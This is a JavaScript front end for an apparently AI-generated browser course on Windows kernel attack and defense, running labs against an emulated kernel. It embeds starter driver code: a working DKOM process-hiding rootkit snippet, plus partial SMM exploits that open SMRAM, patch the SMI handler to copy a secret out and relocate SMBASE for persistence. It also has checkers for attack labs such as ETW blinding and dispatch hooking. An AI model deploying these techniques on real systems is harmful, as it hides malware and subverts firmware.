import "./styles.css";
import "@kernelforge/debugger-ui/styles.css";
import { marked } from "marked";
import { catalog } from "@kernelforge/course-content";
import {
  checkFlag, submitFlagForProgress,
  emptyProgress, resolveBackend,
} from "@kernelforge/lab-runtime";
import { loadProgress, saveProgress } from "@kernelforge/lab-runtime/storage.browser";
import { getScenario, tryLoadDumpWorld, tryLoadCarvedState } from "./scenarios.js";
import { validateDriverSource } from "./driver-builder.mjs";
import { loadCompiledDriver } from "@kernelforge/ntsim-analyzer/src/compiled.mjs";
import { compileDriverSource, warmupCompiler } from "@kernelforge/compiler-worker/index.browser.mjs";
import { loadTables } from "./tables.js";
import { paneFor } from "./panes.js";
import { createDebugger } from "./debugger.js";
import { createDebugConsole, disposeConsoles } from "./console.js";
import { createCodeEditor, disposeAllEditors, disposeShells } from "@kernelforge/debugger-ui";
import { renderAnalyzer } from "./analyzer.js";

warmupCompiler(); // preload the wasm toolchain in the background

const app = document.getElementById("app");
let progress = emptyProgress();
let currentDebugger = null;
let currentKernel = null;
let currentSession = null;

/** lab card -> {facade?, host} of the currently mounted graphical shell.
 *  Boot / Reset must REPLACE the shell (dispose timers/hotkeys, drop host),
 *  never stack a second one above the console. */
const mountedShells = new WeakMap();

function kernel_processByName(kernel, name) {
  return kernel.processesByName.get(name) ?? null;
}

/** Starter code: catalog-provided source first, legacy hardcoded fallbacks after. */
function getStarterCode(lab) {
  const provided = (lab.starterFiles ?? []).find((f) => f.content?.trim());
  if (provided) return provided.content;
  if (lab.id.includes("dkom")) {
    return `// DKOM process hiding — unlink kftarget.exe from ActiveProcessLinks
//
// This driver demonstrates Direct Kernel Object Manipulation:
// 1. Locate the target _EPROCESS by PID
// 2. Overwrite its ActiveProcessLinks to remove it from the list
// 3. The process becomes invisible to !process / NtQuerySystemInformation

#include <ntddk.h>

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PEPROCESS targetProcess = NULL;
    HANDLE targetPid = (HANDLE)888; // kftarget.exe

    NTSTATUS status = PsLookupProcessByProcessId(targetPid, &targetProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrint("DKOM: Failed to find pid %lu\\n", (ULONG)(ULONG_PTR)targetPid);
        return status;
    }

    PLIST_ENTRY pLinks = (PLIST_ENTRY)((PUCHAR)targetProcess + 0x448);
    RemoveEntryList(pLinks);
    DbgPrint("DKOM: unlinked kftarget.exe, LIST_ENTRY @ %p\\n", pLinks);

    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}
`;
  }

  if (lab.id.includes("smm-vault")) {
    return `// SMM vault: open SMRAM from ring 0, patch the SMI handler, and make
// ring -2 exfiltrate the secret into your landing page.
//
// Chipset facts (Q35-style, device 0:0:0):
//   SMRAMC lives at config offset 0x9c (dword lane; the SMRAMC byte).
//   Bits: [3]=D_OPEN [2]=D_CLS [1]=D_LCK [0]=G_SMRAME
//   TSEG (SMRAM) = 0x7f000000..0x7f7fffff, SMBASE default 0x7f300000,
//   SMI handler entry = SMBASE + 0x8000.
// APMC port 0xB2: writing 0x01 latches an SMI. The lab dispatches it for
// you after DriverEntry returns.

#include <ntddk.h>

static __inline void outbyte(unsigned short Port, unsigned char Value) {
    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
}

#define PCI_CFG_ADDR 0xCF8
#define PCI_CFG_DATA 0xCFC
#define APMC_PORT    0xB2

#define SMRAMC_REG   0x9c
#define TSEG_BASE    0x7f300000u          /* SMBASE inside TSEG */
#define HANDLER_OFF  0x8000               /* SMBASE + 0x8000 */

/* landing page the lab watches after the SMI fires */
#define LANDING      ((unsigned char*)0xffffe00010000000ULL)

/* The firmware handler we plant: copy 16 bytes of the secret at
 * SMBASE+0x1000 into RCX's saved value... too clever. Instead it copies
 * from a FIXED address you choose below straight into LANDING. */
#define SECRET_VA    (TSEG_BASE + 0x1000)

static const unsigned char HANDLER_PATCH[] = {
    /* movabs rsi, SECRET_VA ; movabs rdi, LANDING ; mov ecx,16 ; rep movsb ; ret
       (the two imm64s below are pre-filled for the default TSEG/LANDING) */
    0x48, 0xBE, 0x00, 0x00, 0x30, 0x7F, 0x00, 0x00, 0x00, 0x00, // movabs rsi, SECRET_VA
    0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, // movabs rdi, LANDING
    0xB9, 0x10, 0x00, 0x00, 0x00,                               // mov ecx, 16
    0xF3, 0xA4,                                                 // rep movsb
    0xC3,
};

void PatchSmram(void) {
    // 1) program CF8 with (ENABLE_BIT | (0<<16) | (0<<11) | (0<<8) | SMRAMC_REG)
    unsigned int addr = 0x80000000u | SMRAMC_REG;
    // TODO: write 'addr' to PCI_CFG_ADDR and then write 0x09 (D_OPEN|G_SMRAME)
    //       to PCI_CFG_DATA to OPEN the vault.

    // 2) while open: overwrite the handler page at TSEG_BASE+HANDLER_OFF
    //      with HANDLER_PATCH (fix its movsb encoding first!)

    // 3) close it again: rewrite SMRAMC with 0x01 to cover your tracks.
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PatchSmram();
    outbyte(APMC_PORT, 0x01);   // fire!
    DbgPrint("SMM-VAULT: latch set\\n");
    return STATUS_SUCCESS;
}
`;
  }

  if (lab.id.includes("smm-reloc")) {
    return `// SMBASE relocation: your patched SMI handler rewrites the save-state's
// SMBASE field BEFORE RSM, so the NEXT SMI enters code you planted.
//
// Canonical anchor: the x64 SMRAM save-state stores SMBASE at offset
// 0xFB04 from the (old) SMBASE — SDM Vol.3 ch.34. Handler entry is
// SMBASE+0x8000. TSEG spans 0x7f000000..0x7f7fffff.
//
// Pick NEW_BASE anywhere free inside TSEG. Plant this stub at
// NEW_BASE+0x8000:
//     movabs rax, LANDING2 ; mov dword [rax], 0x4B46324D ('MF2K') ; ret
// Then patch the CURRENT handler to: store NEW_BASE into old+0xFB04 ; ret

#include <ntddk.h>

static __inline void outbyte(unsigned short Port, unsigned char Value) {
    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
}

#define PCI_CFG_ADDR 0xCF8
#define PCI_CFG_DATA 0xCFC
#define APMC_PORT    0xB2
#define SMRAMC_REG   0x9c

#define OLD_BASE     0x7f300000u
#define NEW_BASE     0x0u        /* TODO: choose an aligned base inside TSEG */
#define SAVE_SMBASE_OFF 0x0u     /* TODO: canonical save-state offset */
#define LANDING2     ((unsigned int*)0xffffe00020000000ULL)

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    unsigned int addr = 0x80000000u | SMRAMC_REG;
    // TODO: open SMRAM (D_OPEN|G_SMRAME) via CF8/CFC like last module...

    // TODO: plant the stub at NEW_BASE+0x8000:
    //   bytes: 48 B8 <landing2 imm64> C7 00 4D 32 46 4B C3
    //          ("movabs rax,imm64; mov dword [rax],'MF2K'; ret")

    // TODO: patch the OLD handler at OLD_BASE+0x8000:
    //   bytes: C7 05 <rel32=SAVE_SMBASE_OFF-...> or simpler absolute:
    //   48 B8 <abs=OLD_BASE+SAVE_SMBASE_OFF> ; B8/BA? keep simple:
    //   C7 40 04 ... nope — use: mov dword [abs],NEW_BASE via
    //   48 B8<abs> ; B8<new> hmm — full working bytes are in the lesson!

    // TODO: close SMRAM, latch SMI (0xB2). The lab runs TWO SMIs for you.
    return STATUS_SUCCESS;
}
`;
  }
  return "// Write your driver code here\n";
}

async function persist() {
  await saveProgress(progress);
}

const solvedCount = () => Object.keys(progress.solvedFlags).length;
const totalPoints = () => progress.points ?? 0;

// --------------------------------------------------- compiler-lab tasks
// Each compiler lab declares `compileTask`; the task owns source validation
// and post-run verification against live kernel state.

function verifyDkomTask(kernel, loaded, status) {
  const kftarget = kernel_processByName(kernel, "kftarget.exe");
  if (!kftarget) {
    status("err", "kftarget.exe not found in process list!");
    return false;
  }
  const stillVisible = kernel.listProcesses().some((p) => p.name === "kftarget.exe");
  const unloadSet = kernel.mem.u64(loaded.drvRec.va + 0x68n) !== 0n;
  const printed = [...kernel.dbgLog].reverse().find((l) => l.includes("_LIST_ENTRY"));

  if (stillVisible) {
    status("warn", "!process still shows kftarget.exe — DKOM may not have worked.");
  } else {
    status("good", "✓ kftarget.exe hidden!");
  }
  if (!unloadSet) {
    status("warn", "DriverUnload was not set on DriverObject.");
  }
  if (printed) {
    status("mono", printed.trim());
    const addr = printed.match(/LIST_ENTRY at:\s*([0-9a-f`]+)/i);
    if (addr) status("good", `LIST_ENTRY @ 0x${addr[1].replace(/`/g, "")}`);
  }
  return !stillVisible;
}

const HOOK_API = "PsLookupProcessByProcessId";

function verifyInlineHookTask(kernel, loaded, status) {
  const detoured = kernel.isDetoured(HOOK_API);
  const thunk = kernel.apiThunks.get(HOOK_API);
  const printed = [...kernel.dbgLog].reverse().find((l) => l.includes("kfdetour:"));
  const unloadSet = kernel.mem.u64(loaded.drvRec.va + 0x68n) !== 0n;

  if (!detoured) {
    status("err", "!hookscan would show nothing — your driver did not write an E9 to " +
      `${HOOK_API}'s prologue. Did you paste the export address into g_TargetFn?`);
    return false;
  }
  status("good", `✓ ${HOOK_API} prologue @ ${thunk ? "0x" + thunk.toString(16) : "?"} reads as detoured.`);
  status("dim", "Prove it: !hookscan, then !hooktest PsLookupProcessByProcessId 888");
  if (printed) {
    status("mono", printed.trim());
  }
  if (!unloadSet) {
    status("warn", "DriverUnload was not set on DriverObject.");
  }
  return true;
}

const COMPILE_TASKS = {
  "dkom-hide": { validate: (src) => validateDriverSource(src, "dkom-hide"), verify: verifyDkomTask },
  "inline-hook": { validate: (src) => validateDriverSource(src, "inline-hook"), verify: verifyInlineHookTask },
};

/** Defense-lab tasks verify via the sensor's own DbgPrint telemetry. */
function logJoin(kernel) { return kernel.dbgLog.join("\n"); }

function makeSentinelVerify(patterns) {
  return (kernel, _loaded, status) => {
    const log = logJoin(kernel);
    let ok = true;
    for (const [label, rx] of patterns) {
      if (rx.test(log)) status("good", `✓ ${label}`);
      else { ok = false; status("err", `✗ missing: ${label}`); }
    }
    if (ok) status("dim", "Sensor telemetry complete — read findings from the debugger.");
    return ok;
  };
}

COMPILE_TASKS["ul-inject"] = {
  validate: (src) => validateDriverSource(src, "inject"),
  verify: makeSentinelVerify([
    ["handle minted for pid 888", /ZwOpenProcess: pid 888 -> handle/],
    ["handle-based write landed", /INJ: handle-based write -> ok/],
    ["attach-based write landed", /INJ: attach-based write -> ok/],
    ["completion secret", /secret=kf-ul-inject-ok/],
  ]),
};

COMPILE_TASKS["sentinel-v1"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["process-list walk", /SENTINEL-V1: process list walk/],
    ["DKOM carve detection", /carve hit 'kftarget\.exe'.*pid=888|no hidden-process signatures/],
    ["unbacked-exec classification", /UNBACKED EXEC DETECTED|belongs to a listed module/],
    ["completion secret", /secret=kf-sentinel-v1-ok/],
  ]),
};
COMPILE_TASKS["sentinel-v2"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["IRQL sampling", /SENTINEL-WATCHDOG: sampled IRQL = 15/],
    ["ladder restoration", /ladder restored to 2/],
    ["watchdog secret", /secret=kf-watchdog-ok/],
  ]),
};
COMPILE_TASKS["sentinel-v3"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["PsLookupProcessByProcessId attested", /SENTINEL-ATTEST: PsLookupProcessByProcessId/],
    ["hook conviction", /INLINE HOOK DETECTED/],
    ["completion secret", /secret=kf-attest-ok/],
  ]),
};
COMPILE_TASKS["sentinel-v4"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    // %p renders without 0x; %02x pads to 8 digits (model formatter limits)
    ["guard sweep ran", /SENTINEL-POOLMON: block 0 @ fffff90000001000 guard intact/],
    ["corruption convicted", /block 1 @ fffff90000001200.*CORRUPTED/],
    ["completion secret", /secret=kf-poolmon-ok/],
  ]),
};

// --- module-2 attack/defense workshop tasks -------------------------------
// Attacker tasks verify the attack's own telemetry; the hardened variant
// additionally expects the modeled HVCI interception + bugcheck.
COMPILE_TASKS["attack-wpoff"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["IRQL raise into window", /ATTACK-WPOFF: raised to IRQL 2/],
    ["WP cleared inside window", /inside window IRQL=2 WP=0/],
    ["canary tamper", /detour copied over canary/],
    ["window closed + restored", /window closed; CR0 restored to 0000000080010031 \(IRQL 2\)/],
  ]),
};
COMPILE_TASKS["attack-wpoff-hvci"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["raise attempted", /ATTACK-WPOFF: raised to IRQL 2/],
    ["HVCI interception", /\[hvci\] CR0\.WP-clearing write intercepted/],
    ["bugcheck 0x109 raised", /CRITICAL_STRUCTURE_CORRUPTION/],
  ]),
};
COMPILE_TASKS["attack-lockdown"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["core 1 pinned", /ATTACK-LOCKDOWN: core 1 pinned at IRQL 2/],
    ["core 2 pinned", /ATTACK-LOCKDOWN: core 2 pinned at IRQL 2/],
    ["core 3 pinned", /ATTACK-LOCKDOWN: core 3 pinned at IRQL 2/],
    ["exposure window declared", /kernel structures exposed/],
  ]),
};
COMPILE_TASKS["attack-timerdpc"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["timer armed", /TIMER-PERSIST: armed \(due \+3, period 5\)/],
    ["pump hint emitted", /!dpcpump 13/],
  ]),
};
COMPILE_TASKS["attack-hijack"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["victim routine observed", /ATTACK-HIJACK: victim DeferredRoutine was fffff8055a701400/],
    ["patch in place", /patched in place - retire the queue/],
  ]),
};

// --- m24 dispatch-layer tasks ----------------------------------------------
COMPILE_TASKS["attack-irp"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["victim slot observed", /ATTACK-IRP: victim slot held fffff8055a[0-9a-f]{6}/],
    ["slot rewritten to trampoline", /MajorFunction\[IRP_MJ_DEVICE_CONTROL\] now -> fffff8055a730000/],
  ]),
};
COMPILE_TASKS["sentinel-v5"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["table walk", /SENTINEL-V5: attesting DRIVER_OBJECT kfser @ fffff8055a710000/],
    ["foreign dispatch convicted", /FOREIGN DISPATCH IRP_MJ_DEVICE_CONTROL -> fffff8055a720800/],
    ["OpenProcedure convicted", /Process\.OpenProcedure HOOKED -> fffff8055a720900/],
    ["completion secret", /secret=kf-sentinel-v5-ok/],
  ]),
};

// --- m26 ETW tasks -----------------------------------------------------------
COMPILE_TASKS["attack-etwtamper"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["baseline observed", /ATTACK-ETW: CKCL EnableFlags was 0x000000ff/],
    ["gate closed", /CKCL EnableFlags now 0x00000000 - gate closed/],
  ]),
};
COMPILE_TASKS["sentinel-v7"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["attestation ran", /SENTINEL-V7: attesting logger CKCL @ fffff8055a740000/],
    ["drift convicted", /EnableFlags DRIFT 0x000000ff -> 0x00000000 \(BLINDED\)/],
    ["baseline re-asserted", /SENTINEL-V7: baseline re-asserted -> 0x000000ff/],
    ["completion secret", /secret=kf-sentinel-v7-ok/],
  ]),
};

// --- m25 architectural tasks -------------------------------------------------
COMPILE_TASKS["sentinel-v6"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["LSTAR read", /SENTINEL-V6: IA32_LSTAR = fffff8055a760800/],
    ["redirect convicted", /LSTAR REDIRECTED -> foreign handler fffff8055a760800/],
    ["attribution", /attributed to kfarch\.sys\+0x800/],
    ["completion secret", /secret=kf-sentinel-v6-ok/],
  ]),
};
COMPILE_TASKS["sentinel-telemetry"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["IRQL + queue depth sampled", /SENTINEL-TELEMETRY: sampled IRQL = 15 queue-depth = 1/],
    ["anomaly declared", /stranded work on a pinned core/],
    ["ladder restored", /ladder restored to 2/],
    ["completion secret", /secret=kf-watchdog-ok/],
  ]),
};
COMPILE_TASKS["sensor-deadline"] = {
  validate: (src) => validateDriverSource(src, "sentinel"),
  verify: makeSentinelVerify([
    ["lockdown applied", /SENTINEL-WD: cores pinned; core 1 at IRQL 2/],
    ["deadline missed", /DEADLINE-MISSED/],
    ["telemetry secret", /secret=kf-deadline-ok/],
  ]),
};

COMPILE_TASKS["smm-vault"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["SMRAM opened", /D_OPEN set|SMRAM opened|vault opened/],
    ["SMI triggered", /SMI|port 0xB2|trigger/],
    ["exploit complete", /secret|exfiltrat|landing/i],
  ]),
};

COMPILE_TASKS["smm-reloc"] = {
  validate: (src) => validateDriverSource(src, "attack"),
  verify: makeSentinelVerify([
    ["SMBASE relocated", /SMBASE|relocat/i],
    ["stub planted", /stub|handler|new.*base/i],
    ["persistence achieved", /persist|second.*SMI|reloc.*complete/i],
  ]),
};

const taskFor = (lab) => COMPILE_TASKS[lab.compileTask ?? (lab.id.includes("dkom") ? "dkom-hide" : "")] ?? null;

// ---------------------------------------------------------------- rendering

function h(tag, attrs, ...children) {
  const el = document.createElement(tag);
  // NB: defaults don't cover explicit `null` callers — normalize instead.
  for (const [k, v] of Object.entries(attrs ?? {})) {
    if (k === "class") el.className = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else if (v !== undefined && v !== null) el.setAttribute(k, String(v));
  }
  for (const c of children.flat()) {
    if (c == null) continue;
    el.appendChild(typeof c === "string" ? document.createTextNode(c) : c);
  }
  return el;
}

function refreshHeader() {
  const el = document.querySelector(".points");
  if (el) el.textContent = `${solvedCount()} flags · ${totalPoints()} pts`;
}

function renderShell() {
  app.innerHTML = "";
  const header = h("header", null,
    h("span", { class: "logo" }, "⚒ KernelForge"),
    h("span", { class: "spacer" }),
    h("span", { class: "points" }, `${solvedCount()} flags · ${totalPoints()} pts`),
  );
  app.append(header, h("div", { id: "layout" },
    h("aside", { id: "sidebar" }),
    h("main", { id: "main" }),
  ));
  renderSidebar();
  renderWelcome();
}

function renderSidebar() {
  const sidebar = document.getElementById("sidebar");
  sidebar.innerHTML = "";
  sidebar.append(h("h2", null, "Tools"));
  const analyzerBtn = h("button", {
    class: "tool",
    onclick: () => renderAnalyzer(document.getElementById("main")),
  }, "⚒ Driver Analyzer (.sys)");
  sidebar.append(analyzerBtn);
  const linuxAnalyzerBtn = h("button", {
    class: "tool",
    onclick: async () => {
      const { renderLinuxAnalyzer } = await import("./linux-analyzer.js");
      renderLinuxAnalyzer(document.getElementById("main"));
    },
  }, "🐧 Linux Driver Analyzer (.ko)");
  sidebar.append(linuxAnalyzerBtn);
  // Floating pyre-style decompiler/disassembler workspace. Overlays the
  // current lesson — students never leave the page they are studying.
  const analysisBtn = h("button", {
    class: "tool",
    onclick: async () => {
      const { openAnalysis } = await import("./analysis.js");
      openAnalysis(currentSession);
    },
  }, "⚗ Ghidra Analysis");
  sidebar.append(analysisBtn);
  // Free navigation: every lesson is selectable so players can jump straight
  // to the topics they care about. The progression chain stays in the data
  // and still drives points/completion marks — it guides, it no longer gates.
  for (const mod of catalog.modules) {
    sidebar.append(h("h2", null, mod.title));
    for (const lesson of mod.lessons) {
      const done = progress.completedLessons.includes(lesson.id);
      sidebar.append(h("button", {
        class: `lesson ${done ? "done" : ""}`,
        onclick: () => renderLesson(lesson),
      }, `${done ? "✔" : "▸"} ${lesson.title}`));
    }
  }
}

function renderWelcome() {
  const main = document.getElementById("main");
  main.innerHTML = "";
  main.append(
    h("div", { class: "card" },
      h("h1", null, "Kernel Fundamentals"),
      h("p", null, "Hi! This course was entirely AI generated and is still a work in progress. I haven't gone through every module yet and honestly, some of the labs are pretty bad. I initially built this for two reasons: 1) I wanted to brush up on my Windows Internals 2) I have a ton of articles in my reading backlog that I will probably never get to and I still wanted to cover the concepts or get an idea of what the technique is. These little modules try to cover the concepts introduced by these articles and give a semi/fake hands-on lab where you can practice the skill without having to spin up a Windows VM, configure serial debugging and attach windbg to it to end up having to reboot the VM 10 times because serial just stops working for some reason. If this whole experience sounds familiar, then feel free to poke around and report any issues you find on GitHub. Just be aware the labs and course are still very much in their POC phase and will likely change quite a bit as I update and polish this project."),
      h("p", null, "Pick a lesson from the sidebar. Labs boot a real x64 Windows " +
        "kernel model in your browser — inspect it with the debugger console, " +
        "solve the objectives, submit flags."),
      h("p", { class: "dim" }, "Progress lives in IndexedDB on this machine only."),
    ),
  );
}

// ------------------------------------------------------------ lab rendering

/**
 * Upgrade lesson fenced code blocks (```c / ```cpp / ```js / ```json) to
 * lazy read-only Monaco editors. Console-transcript fences (kd>, gdb>…) and
 * untagged blocks stay plain <pre>. Mounting is IntersectionObserver-gated so
 * lessons with many snippets stay fast.
 */
const FENCE_LANGS = {
  c: "c", cpp: "cpp", "c++": "cpp", h: "cpp",hpp: "cpp",
  js: "javascript", javascript: "javascript", json: "json",
};

function upgradeCodeFences(body) {
  const fences = [];
  for (const code of body.querySelectorAll("pre > code[class*=\"language-\"]")) {
    const lang = [...code.classList]
      .find((c) => c.startsWith("language-"))
      ?.slice(9)?.toLowerCase();
    const monacoLang = FENCE_LANGS[lang ?? ""];
    if (!monacoLang) continue;
    const src = code.textContent;
    if (!src.trim()) continue;
    const pre = code.parentElement;
    const holder = h("div", { class: "fence-editor" });
    pre.replaceWith(holder);
    fences.push({ holder, src, monacoLang, mounted: false });
  }
  const mountFence = (f) => {
    if (f.mounted) return;
    f.mounted = true;
    // content-sized height (Monaco needs an explicit box), capped for huge
    // dumps. The height travels to the editor host itself — sizing the outer
    // .fence-editor box instead used to clip the textarea fallback and let
    // the Monaco canvas paint over the lesson text below it.
    const lines = f.src.split("\n").length;
    const px = `${Math.min(Math.max(lines * 19 + 10, 60), 480)}px`;
    void createCodeEditor(f.holder, {
      value: f.src,
      language: f.monacoLang,
      readOnly: true,
      lineNumbers: true,
      height: px,
    });
  };
  if (typeof IntersectionObserver === "undefined") {
    // headless DOM / exotic embeds: mount everything right away
    for (const f of fences) mountFence(f);
    return;
  }
  const io = new IntersectionObserver((entries) => {
    for (const entry of entries) {
      if (!entry.isIntersecting) continue;
      const f = fences.find((x) => x.holder === entry.target && !x.mounted);
      if (!f) continue;
      mountFence(f);
      io.unobserve(entry.target);
    }
  }, { rootMargin: "200px" });
  for (const f of fences) io.observe(f.holder);
}

function renderLesson(lesson) {
  const main = document.getElementById("main");
  disposeConsoles(); // terminals from the previous lesson render
  disposeShells();
  disposeAllEditors();
  void (async () => {
    // floating analysis workspace is a singleton overlay; re-bind on next open
    try {
      const { closeAnalysis } = await import("./analysis.js");
      closeAnalysis();
    } catch { /* not loaded yet */ }
  })();
  main.innerHTML = "";

  // Lesson body: markdown (shipped as content modules in course-content).
  const card = h("div", { class: "card" }, h("h1", null, lesson.title));
  const body = h("div", { class: "lesson-body md" });
  if (typeof lesson.body === "string" && lesson.body.length) {
    body.innerHTML = marked.parse(lesson.body);
    upgradeCodeFences(body);
  } else {
    body.append(h("p", { class: "dim" }, "(no lesson text)"));
  }
  card.append(body);
  main.append(card);

  for (const lab of lesson.labs) {
    // quiz labs: no world, no console — brief + flags only
    if (lab.kind === "quiz") {
      const card = h("div", { class: "card lab" },
        h("h2", null, lab.title + " ", h("code", { class: "kind" }, lab.kind)),
        h("p", null, lab.brief),
      );
      main.append(card);
      renderFlagInputs(card, lab, lesson);
      continue;
    }
    const pane = paneFor(lab.kind) ?? {};
    // xterm.js-backed console (inq fallback in headless DOMs); input is
    // inline — every submitted line routes to currentDebugger.exec.
    // Prompt is per-pane: linux shows "guest> ", windbg shows "kd> ".
    const consoleHost = h("div", { class: "console-host" });
    const consoleReady = createDebugConsole(consoleHost, {
      onSubmit: (line) => currentDebugger?.exec(line),
      prompt: pane.prompt ?? "kd> ",
      placeholder: pane.placeholder,
    });
    const backends = pane.backends ?? [
      { value: "js", label: "CPU: JsInterpreter (deterministic)" },
      { value: "unicorn", label: "CPU: Unicorn (QEMU wasm)" },
    ];
    const backendSel = h("select", {},
      backends.map((b) => h("option", { value: b.value }, b.label)));
    const bootBtn = h("button", {
      class: "primary",
      onclick: async () => {
        bootBtn.disabled = true;
        bootBtn.textContent = "booting…";
        const dbg = await consoleReady;
        try {
          const scenario = getScenario(lab.scenario);
          const factory = pane.rawBoot ? null : await resolveBackend(backendSel.value);
          const dumpWorld = pane.noDump ? null : await tryLoadDumpWorld();
          const io = pane.rawBoot ? {} : {
            makeBackend: (mem) => factory(mem),
            loadTables: () => loadTables(),
            dumpWorld,
            carvedState: pane.noDump ? null : await tryLoadCarvedState(),
          };
          const session = await scenario.boot(io);
          dbg.innerHTML = "";
          currentSession = session;
          currentKernel = session.kernel ?? null;
          currentDebugger = pane.createDebugger
            ? pane.createDebugger(session, dbg)
            : createDebugger(session.kernel, dbg);
          if (!pane.noDump && session.dumpPagesLoaded > 0) {
            currentDebugger.write(
              `CARVED-DUMP MODE: ${session.dumpPagesLoaded} genuine pages ` +
              `(ntoskrnl/CI/cng) loaded at true VAs from a public kernel dump.`);
          }
          if (dumpWorld && !pane.noDump) {
            currentDebugger.write(
              `REAL-DUMP MODE: ${dumpWorld.meta.processCount} processes, ` +
              `${dumpWorld.meta.moduleCount} modules extracted from a genuine ` +
              `Windows kernel dump (${dumpWorld.meta.source}).`);
          }
          currentDebugger.write(`Booted "${lab.scenario}" on the ${backendSel.value} backend. Type 'help'.`);
          // pane-registered graphical debugger shell (docks above the console).
          // Replace any previous mount for this card: dispose its facade
          // (interval/hotkey/listener teardown) and drop the host element.
          if (pane.mountShell) {
            const prev = mountedShells.get(card);
            if (prev) {
              try { prev.facade?.dispose?.(); } catch { /* best effort */ }
              prev.host?.remove();
            }
            const shellHost = h("div", { class: "shell-host" });
            consoleHost.before(shellHost);
            let facade = null;
            try {
              // sogen panes resolve their backend asynchronously (wasm probe)
              facade = await pane.mountShell(session, {
                card, consoleHost, shellHost, h,
                consoleDebugger: currentDebugger,
              });
            } catch (err) {
              console.warn("debugger shell mount failed:", err);
              currentDebugger.write(`debugger shell unavailable: ${err.message}`, "warn");
            }
            mountedShells.set(card, { facade, host: shellHost });
          }
          dbg.focusTarget?.focus?.();
        } catch (e) {
          dbg.innerHTML = "";
          dbg.write(`boot failed: ${e.message}`, "err");
        } finally {
          bootBtn.disabled = false;
          bootBtn.textContent = "Boot / Reset";
        }
      },
    }, "Boot / Reset");

    const card = h("div", { class: "card lab" },
      h("h2", null, lab.title + " ", h("code", { class: "kind" }, lab.kind)),
      h("p", null, lab.brief),
    );

    // pane-registered editors (e.g. linux LKM IDE)
    if (pane.attachEditor) {
      const editorStatus = h("div", { class: "compile-status" });
      card.append(pane.attachEditor({
        h,
        lab,
        status: (text, cls = "dim") => editorStatus.append(h("div", { class: cls }, text)),
        getSession: () => ({ linux: currentSession?.linux ?? null }),
      }));
      card.append(editorStatus);
    }

    if (lab.kind === "compiler") {
      const task = taskFor(lab);
      // Shared Monaco service (@kernelforge/debugger-ui) — textarea fallback
      // keeps headless tests and offline bundles working.
      const editorHost = h("div", { class: "lab-editor" });
      let editorHandle = null;
      void createCodeEditor(editorHost, {
        value: getStarterCode(lab),
        language: "cpp",
        minimap: true,
        height: "420px",
      }).then((hd) => { editorHandle = hd; });
      const readSrc = () => editorHandle?.getValue?.() ?? getStarterCode(lab);
      const compileBtn = h("button", { class: "primary" }, task ? "Compile & Load Driver" : "(unsupported lab)");
      compileBtn.disabled = !task;
      const compileStatus = h("div", { class: "compile-status" });
      const status = (cls, text) =>
        compileStatus.append(h("div", { class: cls }, text));
      compileBtn.addEventListener("click", async () => {
        if (!task) return;
        compileStatus.innerHTML = "";
        const src = readSrc();
        const validation = task.validate(src);
        if (!validation.ok) {
          for (const err of validation.errors)
            compileStatus.append(h("div", { class: "err" }, "✗ " + err));
          return;
        }
        for (const warn of validation.warnings)
          compileStatus.append(h("div", { class: "dim" }, "⚠ " + warn));
        compileStatus.append(h("div", { class: "good" }, "✓ Code validated — compiling..."));

        // Boot if needed
        if (!currentDebugger) {
          bootBtn?.click();
          if (!currentDebugger) {
            status("err", "boot failed");
            return;
          }
        }

        // Real compilation: in-browser wasm clang first, server bridge fallback.
        // Managing a clean compile IS part of the exercise: no simulated fallback.
        let objBytes, via;
        try {
          ({ objBytes, via } = await compileDriverSource(src));
        } catch (err) {
          status("err", "✗ compile failed: " + err.message);
          return;
        }
        const viaMsg = via === "wasm"
          ? "compiled in-browser (wasm clang)"
          : "compiled via server fallback";
        status("good", `✓ ${viaMsg} (${objBytes.length} bytes)`);

        // Link + manual-map the student's actual bytes into emulated memory.
        let loaded;
        try {
          loaded = loadCompiledDriver(currentKernel, objBytes, { labId: lab.id });
        } catch (err) {
          status("err", "✗ load failed: " + err.message);
          return;
        }
        status("good", `✓ mapped at 0x${loaded.base.toString(16)} as ${loaded.name}`);

        // Execute DriverEntry on the session's CPU engine (SEH-aware).
